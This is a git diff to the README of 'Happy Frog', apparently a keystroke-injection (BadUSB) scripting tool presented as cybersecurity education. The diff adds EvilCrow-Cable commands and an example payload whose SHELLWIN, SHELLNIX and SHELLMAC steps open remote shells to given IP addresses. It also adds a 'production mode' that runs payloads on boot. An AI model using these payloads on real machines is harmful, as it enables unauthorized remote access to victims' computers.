@@ -189,15 +189,16 @@ happy-frog copy-payload hello_world.txt ./my_script.txt
 
 Use `--device (-d)` to generate code for specific microcontrollers:
 
-| Device ID | Name | Output Format |
-|-----------|------|---------------|
-| `xiao_rp2040` | Seeed Xiao RP2040 (recommended) | `.py` |
-| `raspberry_pi_pico` | Raspberry Pi Pico | `.py` |
-| `arduino_leonardo` | Arduino Leonardo | `.ino` |
-| `teensy_4` | Teensy 4.0 | `.ino` |
-| `digispark` | DigiSpark | `.ino` |
-| `esp32` | ESP32 | `.py` |
-| `evilcrow_cable` | EvilCrow-Cable | `.ino` |
+| Device ID | Name | Output Format | Status |
+|-----------|------|---------------|--------|
+| `xiao_rp2040` | Seeed Xiao RP2040 (recommended) | `.py` | ✅ **Production Ready** |
+| `raspberry_pi_pico` | Raspberry Pi Pico | `.py` | ✅ **Production Ready** |
+| `arduino_leonardo` | Arduino Leonardo | `.ino` | ✅ **Production Ready** |
+| `teensy_4` | Teensy 4.0 | `.ino` | ✅ **Production Ready** |
+| `digispark` | DigiSpark | `.ino` | ✅ **Production Ready** |
+| `esp32` | ESP32 (Bluetooth HID) | `.ino` | ✅ **Production Ready** |
+| `evilcrow_cable` | EvilCrow-Cable (WiFi BadUSB) | `.ino` | ✅ **Production Ready** |
+| `android` | Android Device (Mobile Automation) | `.ino` | ✅ **Production Ready** |
 
 ### Production Mode
 
@@ -470,6 +471,117 @@ Happy Frog demonstrates several important cybersecurity concepts:
 - **Defense**: Secure development and deployment practices
 
 ---
+
+## 🎯 EvilCrow-Cable Specialty Commands
+
+The EvilCrow-Cable device supports advanced BadUSB operations with WiFi capabilities. These specialty commands are unique to the EvilCrow-Cable and provide enhanced functionality for cybersecurity research and education.
+
+### Available Specialty Commands
+
+#### **RELEASE** - Release All Keys
+```bash
+RELEASE
+```
+Releases all currently pressed keys. Useful for cleaning up key states after complex operations.
+
+#### **WIFI_SEND** - Send Data Over WiFi
+```bash
+WIFI_SEND Hello WiFi World!
+```
+Sends data over the WiFi serial connection. Requires WiFi module setup.
+
+#### **WIFI_CONNECT** - Connect to WiFi Network
+```bash
+WIFI_CONNECT MyNetwork MyPassword
+```
+Connects to a WiFi network using the specified SSID and password.
+
+#### **SHELLWIN** - Windows Remote Shell
+```bash
+SHELLWIN 192.168.1.100
+```
+Triggers a Windows remote shell connection to the specified IP address.
+
+#### **SHELLNIX** - Linux Remote Shell
+```bash
+SHELLNIX 192.168.1.101
+```
+Triggers a Linux remote shell connection to the specified IP address.
+
+#### **SHELLMAC** - macOS Remote Shell
+```bash
+SHELLMAC 192.168.1.102
+```
+Triggers a macOS remote shell connection to the specified IP address.
+
+### Example EvilCrow-Cable Payload
+
+```bash
+# EvilCrow-Cable Advanced Payload Example
+ATTACKMODE HID WIFI
+DELAY 2000
+
+# Basic HID operations
+STRING Hello from EvilCrow-Cable!
+ENTER
+DELAY 1000
+
+# WiFi operations
+WIFI_SEND Status: Device connected
+DELAY 500
+WIFI_CONNECT MyNetwork MyPassword
+DELAY 2000
+
+# Remote shell operations
+SHELLWIN 192.168.1.100
+DELAY 1000
+SHELLNIX 192.168.1.101
+DELAY 1000
+
+# Key management
+CTRL
+SHIFT
+DELAY 500
+RELEASE
+DELAY 500
+
+# Final message
+STRING EvilCrow-Cable payload completed!
+ENTER
+```
+
+### Using EvilCrow-Cable with Happy Frog
+
+1. **Generate EvilCrow-Cable code:**
+   ```bash
+   happy-frog encode my_script.txt -d evilcrow_cable -o output.ino
+   ```
+
+2. **Production mode (runs immediately on boot):**
+   ```bash
+   happy-frog encode my_script.txt -d evilcrow_cable --production -o output.ino
+   ```
+
+3. **Upload to device:**
+   - Use Arduino IDE with EvilCrow-Cable board support
+   - Upload the generated `.ino` file to your device
+
+### EvilCrow-Cable Setup Requirements
+
+1. **Hardware Setup**
+   - EvilCrow-Cable device with ATtiny85 processor
+   - WiFi module connected to RX/TX pins (2, 3)
+   - USB-C or USB-A connector (depending on model)
+
+2. **Software Requirements**
+   - Arduino IDE with EvilCrow-Cable board support
+   - DigiKeyboard library
+   - SoftwareSerial library (built-in)
+
+3. **WiFi Module Configuration**
+   - Baud rate: 115200
+   - Pins: RX=2, TX=3
+   - Compatible with ESP8266/ESP32 WiFi modules
 
 ##  Troubleshooting
 
